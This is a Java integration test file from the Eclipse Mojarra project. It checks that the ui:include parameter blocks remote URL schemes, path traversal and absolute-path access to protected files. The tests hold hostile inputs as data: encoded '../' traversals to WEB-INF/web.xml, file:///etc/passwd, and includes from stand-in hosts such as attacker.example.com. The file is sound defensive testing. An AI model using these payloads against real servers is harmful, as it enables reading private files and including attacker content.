/*
 * Copyright (c) Contributors to the Eclipse Foundation.
 *
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v. 2.0 which is available at
 * https://www.eclipse.org/legal/epl-2.0, or the Apache License, Version 2.0
 * which is available at https://www.apache.org/licenses/LICENSE-2.0.
 *
 * This Source Code may also be made available under the following Secondary
 * Licenses when the conditions for such availability set forth in the Eclipse
 * Public License v. 2.0 are satisfied: GPL-2.0 with Classpath-exception-2.0 which
 * is available at https://openjdk.java.net/legal/gplv2+ce.html.
 *
 * SPDX-License-Identifier: EPL-2.0 OR GPL-2.0 WITH Classpath-exception-2.0 or Apache-2.0
 */
package org.eclipse.mojarra.test.rce;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.eclipse.mojarra.test.base.BaseIT;
import org.junit.jupiter.api.Test;

public class UiIncludeRceIT extends BaseIT {

    // ── Positive cases: legitimate includes must still work ──

    @Test
    public void testLocalInclude() {
        open("param.jsf?p=local.xhtml");
        assertTrue(getPageSource().contains("safe"));
    }

    @Test
    public void testSubdirectoryInclude() {
        open("param.jsf?p=sub/nested.xhtml");
        assertTrue(getPageSource().contains("nested content"));
    }

    @Test
    public void testHardcodedRemoteIncludeBlocked() {
        open("remote.jsf");
        assertBlocked(getPageSource());
    }

    // ── Remote URL schemes ──

    @Test
    public void testHttpsParam() {
        open("param.jsf?p=https://raw.githubusercontent.com/eclipse-ee4j/mojarra/refs/heads/4.0/test/issue5750/src/main/webapp/issue5750.xhtml");
        String source = getPageSource();
        assertFalse(source.contains("support \"begin\" and \"end\""),
                "Remote content must not be rendered");
        assertBlocked(source);
    }

    @Test
    public void testHttpParam() {
        open("param.jsf?p=http://example.com/evil.xhtml");
        assertBlocked(getPageSource());
    }

    @Test
    public void testFileParam() {
        open("param.jsf?p=file:///etc/passwd");
        String source = getPageSource();
        assertFalse(source.contains("root:"), "File content must not leak");
        assertBlocked(source);
    }

    @Test
    public void testJarProtocol() {
        open("param.jsf?p=jar:file:///tmp/evil.jar!/META-INF/evil.xhtml");
        assertBlocked(getPageSource());
    }

    @Test
    public void testFtpProtocol() {
        open("param.jsf?p=ftp://attacker.example.com/evil.xhtml");
        assertBlocked(getPageSource());
    }

    @Test
    public void testDataProtocol() {
        open("param.jsf?p=data:text/xml,<html/>");
        assertBlocked(getPageSource());
    }

    // ── Path traversal variants ──

    @Test
    public void testDotDotTraversal() {
        open("param.jsf?p=../../WEB-INF/web.xml");
        String source = getPageSource();
        assertFalse(source.contains("<web-app"), "web.xml content must not leak");
        assertBlocked(source);
    }

    @Test
    public void testUrlEncodedTraversal() {
        open("param.jsf?p=..%2F..%2FWEB-INF/web.xml");
        String source = getPageSource();
        assertFalse(source.contains("<web-app"), "Encoded traversal must not leak web.xml");
        assertBlocked(source);
    }

    @Test
    public void testDotEncodedTraversal() {
        open("param.jsf?p=%2e%2e/%2e%2e/WEB-INF/web.xml");
        String source = getPageSource();
        assertFalse(source.contains("<web-app"));
        assertBlocked(source);
    }

    @Test
    public void testDoubleEncodedTraversal() {
        open("param.jsf?p=..%252F..%252FWEB-INF/web.xml");
        String source = getPageSource();
        assertFalse(source.contains("<web-app"));
        assertBlocked(source);
    }

    @Test
    public void testTraversalWithFaceletSuffix() {
        open("param.jsf?p=../../some-other-app/evil.xhtml");
        assertBlocked(getPageSource());
    }

    // ── Absolute path disclosure ──

    @Test
    public void testAbsolutePathToWebXml() {
        open("param.jsf?p=/WEB-INF/web.xml");
        String source = getPageSource();
        assertFalse(source.contains("<web-app"), "WEB-INF/web.xml must not leak");
        assertBlocked(source);
    }

    @Test
    public void testAbsolutePathToXhtmlInWebInf() {
        open("param.jsf?p=/WEB-INF/secret.xhtml");
        String source = getPageSource();
        assertTrue(source.contains("secret WEB-INF content"));
    }

    // ── Malformed / edge-case inputs ──

    @Test
    public void testMalformedUri() {
        open("param.jsf?p=://bad");
        assertBlocked(getPageSource());
    }

    @Test
    public void testEmptyParam() {
        open("param.jsf?p=");
        String source = getPageSource();
        assertFalse(source.contains("NullPointerException"),
                "Empty param must not cause an unhandled NPE");
    }

    @Test
    public void testNoParam() {
        open("param.jsf");
        String source = getPageSource();
        assertFalse(source.contains("NullPointerException"),
                "Missing param must not cause an unhandled NPE");
    }

    @Test
    public void testNonFaceletSuffix() {
        open("param.jsf?p=local.properties");
        assertBlocked(getPageSource());
    }

    private void assertBlocked(String source) {
        assertTrue(
            source.contains("Invalid path")
                || source.contains("Not Found")
                || source.contains("not within the application root")
                || source.contains("must be a relative path")
                || source.contains("is not a Facelet resource"),
            "Request should have been rejected, but page source was: "
                + source.substring(0, Math.min(500, source.length()))
        );
    }
}
